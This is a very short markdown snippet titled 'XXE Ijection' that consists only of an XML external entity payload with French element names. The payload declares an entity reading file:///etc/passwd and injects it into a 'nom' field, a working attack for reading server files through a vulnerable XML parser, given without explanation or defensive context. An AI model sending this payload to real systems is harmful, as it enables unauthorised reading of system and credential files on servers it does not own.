# XXE Ijection

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY lecture_fichier SYSTEM "file:///etc/passwd">
]>
<utilisateur>
  <nom>&lecture_fichier;</nom>
</utilisateur>
```

